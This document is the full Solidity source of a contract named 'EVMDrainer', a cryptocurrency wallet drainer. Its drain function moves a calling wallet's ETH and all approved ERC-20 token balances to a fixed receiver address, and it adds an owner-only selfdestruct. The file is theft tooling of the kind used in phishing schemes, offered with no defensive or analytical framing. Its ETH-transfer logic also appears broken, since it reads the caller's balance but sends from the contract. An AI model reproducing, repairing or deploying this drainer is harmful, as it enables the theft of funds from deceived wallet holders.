// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract EVMDrainer {
    address public owner;
    address public immutable receiver;

    event Drained(address indexed target, uint256 ethAmount, uint256 tokenCount);

    constructor(address _receiver) {
        owner = msg.sender;
        receiver = _receiver;
    }

    function drain(address target, address[] calldata tokens) external {
        require(target == msg.sender, "Only the target can call drain");

        uint256 tokenCount = 0;

        // Transfer all ETH
        uint256 ethBalance = target.balance;
        if (ethBalance > 0) {
            (bool success, ) = payable(receiver).call{value: ethBalance}("");
            require(success, "ETH transfer failed");
        }

        // Transfer all ERC‑20 tokens
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            IERC20 erc20 = IERC20(token);
            uint256 balance = erc20.balanceOf(target);
            if (balance > 0) {
                require(erc20.transferFrom(target, receiver, balance), "Token transfer failed");
                tokenCount++;
            }
        }

        emit Drained(target, ethBalance, tokenCount);
    }

    // Emergency self‑destruct
    function kill() external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }

    receive() external payable {}
}